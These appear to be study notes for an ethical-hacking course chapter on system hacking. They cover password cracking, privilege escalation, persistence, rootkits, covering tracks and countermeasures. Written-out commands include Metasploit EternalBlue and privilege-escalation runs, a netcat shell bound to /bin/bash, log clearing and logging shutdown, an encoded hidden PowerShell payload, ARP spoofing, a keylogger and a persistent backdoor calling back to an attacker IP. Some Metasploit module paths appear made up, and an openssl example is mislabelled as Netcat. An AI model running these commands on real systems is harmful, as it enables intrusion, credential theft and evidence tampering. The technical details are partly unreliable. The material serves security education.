# System Hacking

> #TLDR  
> System hacking focuses on techniques to gain unauthorized access, escalate privileges, maintain control, and cover tracks. Tools like <font color="#adff23">Cain and Abel, Metasploit</font>, and <font color="#adff23">John the Ripper</font> play a key role in simulating attacks and understanding how attackers operate. This chapter delves into methods such as password cracking, vulnerability exploitation, hiding malicious programs, and covering tracks.

---

## **What We Get From This Exercise**
###### #Objectives #SystemHacking

- Demonstrate Different Password Cracking and Vulnerability Exploitation Techniques to Gain Access to the System
- Use Different Privilege Escalation Techniques to Gain Administrative Privileges 
- Use Different Techniques to Hide Malicious Programs and Maintain Remote Access to the System
- Demonstrate Techniques to Hide the Evidence of Compromise
---
- **Understand Techniques to Gain System Access**:
  - Learn how attackers use password cracking, vulnerability exploitation, and client-side attacks to gain unauthorized access.
- **Apply Privilege Escalation Techniques**:
  - Understand vertical and horizontal privilege escalation to gain administrative access.
- **Gain and Maintain Remote Access**:
  - Use backdoors, keyloggers, and service exploitation to retain control over compromised systems.
- **Understand Rootkits**:
  - Differentiate between kernel-level, bootloader, and hypervisor rootkits, and how they hide malicious activities.
- **Apply Steganography and Steganalysis Techniques**:
  - Understand how data can be hidden within images or files, and how attackers use these techniques to conceal information.
- **Cover Evidence of Compromise**:
  - Learn how attackers manipulate logs and use techniques like timestomping to hide their presence.
- **Apply Various System Hacking Countermeasures**:
  - Learn how to defend systems by deploying multi-factor authentication, monitoring file integrity, and using anti-rootkit tools.

---

## **Table of Contents**

1. [Techniques to Gain System Access](#1-techniques-to-gain-system-access)
2. [Privilege Escalation Techniques](#2-privilege-escalation-techniques)
3. [Gaining and Maintaining Remote Access](#3-gaining-and-maintaining-remote-access)
4. [Rootkits](#4-rootkits)
5. [Steganography and Steganalysis](#5-steganography-and-steganalysis)
6. [Covering Tracks](#6-covering-tracks)
7. [System Hacking Countermeasures](#7-system-hacking-countermeasures)
8. [Cain and Abel Walkthrough](#8-cain-and-abel-walkthrough)
9. [Tools and Examples](#9-tools-and-examples)
10. [Additional Tips and Best Practices](#10-additional-tips-and-best-practices)
11. [Summary](#11-summary)

---

## **1. Techniques to Gain System Access**

Gaining access is the first phase of system hacking.
Attackers use several methods:
### 1.1 Password Cracking Techniques

Password cracking is a fundamental step in gaining access. Attackers use:

- **Brute-Force Attacks**: Trying every possible combination until the correct password is found.
- **Dictionary Attacks**: Using a precompiled list of common passwords to match with hashed values.
- **Rainbow Table Attacks**: Matching precomputed hash values with the hashed password.

**Tools**:
- **John the Ripper**: A tool for cracking hashed passwords.
- **Cain and Abel**: Provides multiple password recovery methods, including brute-force, dictionary, and rainbow table attacks for cracking LM, NTLM, and WPA/WPA2 passwords.

### 1.2 Exploiting Vulnerabilities

Attackers exploit known vulnerabilities in software or hardware to gain access. Common methods include:

- **Buffer Overflow Attacks**: Exploiting vulnerabilities in memory handling.
- **SQL Injection**: Injecting malicious SQL commands to extract data from databases.

**Example**:  
Using **Metasploit** to exploit a buffer overflow vulnerability:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
run
```

### 1.3 Client-Side Exploits

Client-side attacks, such as phishing or exploiting browser vulnerabilities, allow attackers to execute malicious code on the user’s machine.

---

## **2. Privilege Escalation Techniques**

Privilege escalation is the process of gaining higher-level access.
Two common forms are:
### 2.1 Horizontal Privilege Escalation

Attackers gain access to another user’s account at the same privilege level, often by stealing session cookies or hijacking user sessions.

### 2.2 Vertical Privilege Escalation

Attackers elevate their privileges from a normal user to an administrative or root user by exploiting system vulnerabilities or cracking administrator passwords.

**Example**:  
Using **Metasploit** to exploit a Windows vulnerability:
```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
run
```

---

## **3. Gaining and Maintaining Remote Access**

After gaining access, attackers maintain control using various methods:
### 3.1 Backdoors

Backdoors are hidden programs that allow attackers to bypass normal authentication processes. Tools like **Netcat** or **Metasploit** are often used to create reverse shells, allowing ongoing remote access.

**Example**:  
Using **Netcat** to create a backdoor:
```bash
nc -lvp 4444 -e /bin/bash
```

### 3.2 Keyloggers and Remote Control

Keyloggers capture keystrokes to gather credentials or sensitive information. Remote control tools allow attackers to monitor and control the victim’s system.

### 3.3 Service Exploitation

Attackers manipulate legitimate services like **WMI** or **Remote Desktop Protocol (RDP)** to maintain access without detection.

---

## **4. Rootkits**

Rootkits are malicious software designed to hide the presence of an attacker by modifying the operating system. Rootkits can operate at various levels:

- **Kernel-Level Rootkits**: These operate at the kernel level and are the hardest to detect because they have the same privileges as the OS.
- **Boot-Loader Rootkits**: They modify the boot sequence, allowing attackers to load malicious code before the OS boots.
- **Hypervisor-Level Rootkits**: Create virtual environments to intercept system calls and hide their presence.

---

## **5. Steganography and Steganalysis**

Steganography allows attackers to hide data within files like images, videos, or audio without arousing suspicion. Common methods include:

- **Image Steganography**: Data is hidden within an image’s pixel values.
- **Video Steganography**: Data is concealed within frames of a video or audio streams.

**Tools**:
- **StegoStick**: A tool for embedding hidden data within images, documents, or audio files.
- **StegOnline**: A web-based tool for hiding or extracting hidden data from images.

**Steganalysis**:  
Steganalysis is the process of detecting and extracting hidden data from steganographic media using forensic techniques.

---

## **6. Covering Tracks**

To avoid detection, attackers employ various methods to erase or hide evidence of their activity:
### 6.1 Clearing Logs

Attackers clear system logs to remove traces of their activities. (Albeit, clear system logs is highly indicative of a breach. Bad idea if the objective is to maintain persistence)
On Windows, logs in **Event Viewer** are commonly cleared. 
On Linux, logs in **/var/log** are targeted.

**Example**:  
Using **Metasploit** to clear Windows logs:
```bash
run post/windows/manage/clearlogs
```

---
### 6.2 Timestomping

Timestomping is the process of altering file creation, modification, or access timestamps to confuse forensic investigators.

**Example**:  
Using the **touch** command in Linux to modify file timestamps:
```bash
touch -t 202201011200 compromised_file.txt
```

---

### 6.3 Disabling System Logging

Attackers may disable system logging to prevent any new logs from being created during their activity, effectively blocking evidence of their presence.

**Example**:  
On **Linux**, disabling syslog temporarily:
```bash
service rsyslog stop
```

To restart logging (if re-enabling is necessary):
```bash
service rsyslog start
```

On **Windows**, using **PowerShell** to stop the Event Log service:
```powershell
Stop-Service -Name EventLog
```

> **Note**: Disabling logging is often a temporary measure, as prolonged disabling can raise suspicion.

---

### 6.4 Log Manipulation

Instead of completely clearing logs, attackers sometimes edit logs to selectively remove entries related to their activities. This method can make forensic detection more challenging as legitimate log entries remain intact.

**Example**:  
Using **auditpol** on **Windows** to disable specific logging temporarily:
```powershell
auditpol /set /subcategory:"Logon" /success:disable /failure:disable
```

> This command selectively disables logging for logon events, which can later be re-enabled with the `enable` option.

---

### 6.5 Rootkits

Rootkits are malicious software designed to hide the presence of processes, files, or system data from users and administrators. They modify core system files and may intercept system calls to hide the attacker’s activities, making them difficult to detect.

**Example**:  
Installing a rootkit on **Linux** using **Metasploit**:
```bash
use exploit/unix/local/rootkit
set SESSION <session_id>
exploit
```

> **Note**: Rootkits are often detected by rootkit-detection tools or kernel integrity checks.

---

### 6.6 Process Hollowing

Process hollowing is a technique where attackers replace the memory of a legitimate process with malicious code. This way, the malicious code runs under the disguise of a trusted process, bypassing some detection mechanisms.

**Example**:  
Using **Metasploit** to inject a payload into a trusted Windows process:
```bash
use exploit/windows/local/process_hollowing
set SESSION <session_id>
set PROCESS <legitimate_process.exe>
exploit
```

---

### 6.7 Fileless Malware

Fileless malware resides entirely in memory and doesn’t write anything to disk, making it harder to detect through traditional file-based antivirus solutions. Attackers often leverage PowerShell scripts or Windows Management Instrumentation (WMI) to deploy fileless attacks.

**Example**:  
Using PowerShell to run a fileless payload directly in memory:
```powershell
powershell -nop -w hidden -enc <base64_encoded_payload>
```

> **Note**: Fileless attacks leave minimal traces on the system, but memory forensics tools can detect them.

---

### 6.8 Using Encrypted Communication

Attackers often use encrypted channels or VPNs to hide their network traffic from Intrusion Detection Systems (IDS) and firewalls, preventing detection and analysis of their activities.

**Example**:  
Using **Netcat** with encryption:
```bash
openssl s_server -quiet -accept 443 -cert mycert.pem -key mykey.pem
```

The attacker can connect using:
```bash
openssl s_client -connect <target_IP>:443
```

> **Note**: Encryption makes traffic analysis difficult, but sophisticated monitoring tools can still detect anomalies in encrypted traffic.

---

## **7. System Hacking Countermeasures**

To protect systems from hacking attempts, implement the following security measures:

- **Use Strong Password Policies**  
  - Enforce complex, unique passwords with a combination of uppercase and lowercase letters, numbers, and special characters.
  - Regularly rotate passwords and avoid reusing old ones.
  - **Example Policy**: Minimum 12 characters with at least one uppercase letter, one number, and one special character.

- **Patch Vulnerabilities**  
  - Regularly update all software, operating systems, and firmware to address known vulnerabilities.
  - Use an automated patch management system to ensure timely updates across the network.
  - **Example Tools**: **WSUS** (for Windows), **Nessus** (for vulnerability scanning), **Qualys** for patch management.

- **Enable Multi-Factor Authentication (MFA)**  
  - Require an additional verification step, such as a one-time code or biometric scan, to access critical systems.
  - This prevents unauthorized access even if attackers manage to crack or steal passwords.
  - **Example**: Use **Google Authenticator** or **Duo** for two-factor authentication on corporate accounts.

- **Monitor Network and System Logs**  
  - Continuously audit logs to identify unusual activity, such as repeated login failures or unexpected file modifications.
  - Implement centralized logging with a **Security Information and Event Management (SIEM)** tool to streamline log management and analysis.
  - **Example Tools**: **Splunk**, **ELK Stack** (Elasticsearch, Logstash, Kibana), **Graylog**.

- **Use File Integrity Monitoring (FIM)**  
  - Deploy FIM to detect unauthorized changes to critical system files, directories, and configurations.
  - FIM tools create a baseline snapshot of file integrity and alert administrators to any alterations.
  - **Example Tools**: **Tripwire**, **OSSEC**, **AIDE** (Advanced Intrusion Detection Environment).

- **Deploy Anti-Rootkit Tools**  
  - Anti-rootkit software scans for and removes rootkits that might be hiding malicious activity.
  - These tools can detect hidden processes, files, and registry entries that conventional antivirus software may miss.
  - **Example Tools**: **GMER**, **RootkitRevealer** (Sysinternals), **Malwarebytes Anti-Rootkit**.

- **Implement Least Privilege Access Control**  
  - Limit user and system permissions to the minimum necessary for functionality.
  - Regularly review and adjust access rights based on job roles and responsibilities to prevent privilege abuse.
  - **Example**: Set up **Role-Based Access Control (RBAC)** policies and remove admin rights from regular user accounts.

- **Encrypt Sensitive Data**  
  - Encrypt data at rest and in transit to prevent unauthorized access if data is intercepted or accessed.
  - Use full disk encryption and secure protocols (e.g., TLS for network traffic) for maximum protection.
  - **Example Tools**: **BitLocker** (Windows), **FileVault** (macOS), **OpenSSL** for TLS.

- **Disable Unused Services and Open Ports**  
  - Reduce the attack surface by disabling unnecessary services and closing unused ports.
  - Regularly scan the network to ensure only required ports are open and active.
  - **Example Tools**: **Nmap** for port scanning, **Netstat** to check active connections.

- **Conduct Regular Security Awareness Training**  
  - Educate employees on secure practices, including recognizing phishing attempts, avoiding social engineering, and managing passwords responsibly.
  - Regular training sessions keep users aware of the latest threats and prevent them from inadvertently compromising security.

- **Use Intrusion Detection and Prevention Systems (IDPS)**  
  - Deploy IDPS to detect and block malicious activity in real-time, providing a proactive defense against attacks.
  - Network-based and host-based intrusion detection systems monitor traffic and alert administrators to suspicious behaviour.
  - **Example Tools**: **Snort**, **Suricata** (network-based), **OSSEC** (host-based).

---

## **8. Cain and Abel Walkthrough**

### 8.1 Overview

**Cain and Abel** is a tool used for password recovery and network traffic analysis. It supports:

- **Password Cracking**: Cracks LM, NTLM, and WPA/WPA2 passwords using brute-force, dictionary, and rainbow table attacks.
- **ARP Poisoning**: Conducts man-in-the-middle attacks to intercept network traffic.

---

### 8.2 Using Cain and Abel for Password Cracking

**Steps**:
1. **Import Hashes**: Load LM/NTLM hashes into Cain and Abel.
2. **Select Attack Method**: Choose between **Dictionary**, **Brute-Force**, or **Rainbow Table** attacks.
3. **Run the Attack**: Start the attack and wait for the correct password to be revealed.

---

### **8.3 Network Sniffing and ARP Poisoning**

Network sniffing and ARP poisoning are techniques attackers use to intercept and analyse network traffic. ARP poisoning allows the attacker to redirect traffic intended for other devices on the network to their own device, enabling data capture.

**Steps**:

1. **Activate Sniffer**  
   - Start the sniffer in **Cain and Abel** or another tool like **Wireshark** to capture network packets.
   - In **Cain and Abel**:
     - Open Cain and Abel, go to the **Sniffer** tab, and click **Start/Stop Sniffer** to begin capturing traffic.

   **Example Command (Wireshark)**:
   ```bash
   sudo wireshark
   ```
   - Launch Wireshark with root privileges to capture all network traffic on the interface.

2. **ARP Poisoning**  
   - Use **ARP Poison Routing (APR)** to poison the ARP cache of target devices. This redirects network traffic intended for the target’s gateway to the attacker’s machine, enabling packet capture.
   - In **Cain and Abel**:
	-  Go to the **APR** tab, select the target devices (e.g., the victim and the gateway), and click **Start/Stop APR** to initiate ARP poisoning.

   **Example Command (arpspoof)**:
   ```bash
   sudo arpspoof -i <interface> -t <target_ip> <gateway_ip>
   ```
   - **-i**: Network interface (e.g., `eth0`).
   - **-t**: IP address of the target (victim) device.
   - **<gateway_ip>**: IP address of the network gateway.

3. **Enable IP Forwarding** (Optional)  
   - Enabling IP forwarding allows the attacker’s device to forward traffic between the victim and gateway, preventing noticeable network interruptions.

   **Example Command (Linux)**:
   ```bash
   echo 1 > /proc/sys/net/ipv4/ip_forward
   ```

4. **Capture and analyse Traffic**  
   - Capture sensitive information like login credentials, session cookies, or other confidential data from the intercepted traffic.
   - In **Cain and Abel**, decrypted passwords and credentials will appear in the **Passwords** tab.
   - In **Wireshark**, use filters (e.g., `http`, `ftp`, `smtp`) to locate specific types of data.

   **Example Wireshark Filter for HTTP Passwords**:
```plaintext
   http.request.method == "POST" && http contains "password"
   ```
   - This filter displays HTTP POST requests containing the word "password," potentially revealing login credentials.

---

**Additional Tools**:
- **Ettercap**: Another powerful tool for ARP poisoning and network sniffing, often used in conjunction with plugins for advanced traffic manipulation.

  **Example Ettercap Command**:
```bash
  sudo ettercap -T -M arp:remote /<target_ip>/ /<gateway_ip>/
```
  - **-T**: Text mode.
  - **-M arp:remote**: Specifies the ARP poisoning attack type (remote ARP poisoning).

---

## **9. Tools and Examples**

### 9.1 John the Ripper

- **Description**: John the Ripper is a powerful password-cracking tool that supports a wide range of hash types, including Unix passwords (DES, MD5, Blowfish), Windows LM hashes, and more. It performs brute-force and dictionary attacks to crack hashed passwords.

- **Use Cases**:
  - **Recover lost passwords**: Useful for penetration testers to recover passwords from password-protected files or systems.
  - **Assess password strength**: Help organizations identify weak passwords and improve their security.
  - **Audit password policies**: Evaluate if users adhere to secure password guidelines by cracking weak passwords.

- **Command Examples**:

  1. **Basic Dictionary Attack**  
```bash
   john --wordlist=passwords.txt hashfile.txt
```
 - **--wordlist**: Specifies a list of potential passwords to try (dictionary attack).
 - **hashfile.txt**: File containing hashed passwords.

  2. **Incremental Brute-Force Attack**  
  ```bash
   john --incremental hashfile.txt
    ```
 - **--incremental**: Brute-forces all possible character combinations.
 - Useful for cracking short passwords with unknown patterns.

  3. **Custom Character Set Attack**  
  ```bash
   john --incremental:Digits hashfile.txt
     ```
 - --incremental:Digits: Uses only digits in the brute-force attempt, useful for numeric-only passwords (e.g., PINs).

  4. **Cracking Zip File Password**  
   ```bash
   zip2john protected.zip > ziphash.txt
   john --wordlist=passwords.txt ziphash.txt
   ```
 - **zip2john**: Converts a ZIP file into a hash format that John can process.
 - The output file (ziphash.txt) is then used by John to attempt password recovery.

  5. **Identify Password Hash Type**  
   ```bash
   john --format=raw-md5 hashfile.txt
    ```
 - **--format=raw-md5**: Specifies the hash type to be cracked; John supports various formats, such as MD5, SHA-256, bcrypt, etc.

---

### 9.2 Metasploit

- **Description**: Metasploit is a comprehensive penetration testing framework with modules for discovering vulnerabilities, exploiting them, escalating privileges, and covering tracks. It streamlines the process of deploying exploits and payloads to gain control of systems.

- **Use Cases**:
  - **Exploiting known vulnerabilities**: Automate attacks on services and applications with known weaknesses.
  - **Post-exploitation**: Once access is gained, use Metasploit for privilege escalation, keylogging, and persistence.
  - **Red team exercises**: Commonly used in red teaming to simulate realistic attacks and test defenses.

- **Command Examples**:

  1. **Launching Metasploit Console**  
   ```bash
   msfconsole
  ```
 - Starts the Metasploit console, the primary interface for managing exploits, payloads, and auxiliary modules.

  2. **Search for an Exploit**  
   ```bash
  search exploit/windows/smb
   ```
 - **search exploit/windows/smb**: Searches for SMB-related exploits (e.g., EternalBlue for Windows).
 - Useful for identifying vulnerabilities in a specific service.

  3. **Using an Exploit Module**  
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
  ```
 - **use exploit/windows/smb/ms17_010_eternalblue**: Loads the EternalBlue exploit for Windows SMB.
 - This particular exploit targets a vulnerability in SMBv1 and is used to gain remote access.

  4. **Setting Exploit Options**  
 ```bash
 set RHOST <target IP>
 set LHOST <your IP>
 set LPORT <listening port>
 ```
 - **RHOST**: Remote host (target IP address).
 - **LHOST**: Local host (your machine’s IP).
 - **LPORT**: Port on which the payload listens for incoming connections.

  5. **Running the Exploit**  
 ```bash
 exploit
 ```
 - Executes the configured exploit on the target system.
 - If successful, provides a session on the target.

  6. **Post-Exploitation Commands**  
 Once a session is established, Metasploit allows for various post-exploitation actions:
 
 - **Meterpreter Shell Access**  
   ```bash
   sessions -i 1
   ```
   - Accesses the Meterpreter shell on the target system.

 - **Privilege Escalation**  
   ```bash
   getsystem
   ```
   - Attempts to elevate privileges to admin/root on the target machine.

 - **Collecting Password Hashes**  
   ```bash
   hashdump
   ```
   - Dumps password hashes from the target’s SAM file (on Windows systems) for offline cracking.

 - **Keylogging**  
   ```bash
   keyscan_start
   ```
   - Starts a keylogger to capture keystrokes on the target machine.

 - **Persistence**  
   ```bash
   persistence -U -i 10 -p 4444 -r <your IP>
   ```
   - Sets up a persistent backdoor that automatically connects to the attacker’s machine every 10 seconds.
   - **-U**: Installs in the user’s startup folder.
   - **-i**: Interval in seconds for reconnection.
   - **-p**: Port for the persistent backdoor connection.
   - **-r**: Remote (attacker) IP.

---

## **10. Additional Tips and Best Practices**

- **Implement Regular Audits**: Perform security audits and log reviews to detect unauthorized access or tampering.
- **Harden Systems**: Disable unnecessary services and applications to reduce the attack surface.
- **User Education**: Train employees on the dangers of phishing and social engineering to prevent client-side exploits.
- **Encrypt Data**: Use encryption for sensitive data to prevent exposure even if the system is compromised.

---

## **11. Summary**

System hacking involves several techniques: gaining access, escalating privileges, maintaining access, and covering tracks. Tools like **Cain and Abel**, **Metasploit**, and **John the Ripper** are crucial for simulating real-world attacks and testing system defenses. To counter these threats, strong password policies, multi-factor authentication, and log monitoring are essential to mitigate system hacking attempts.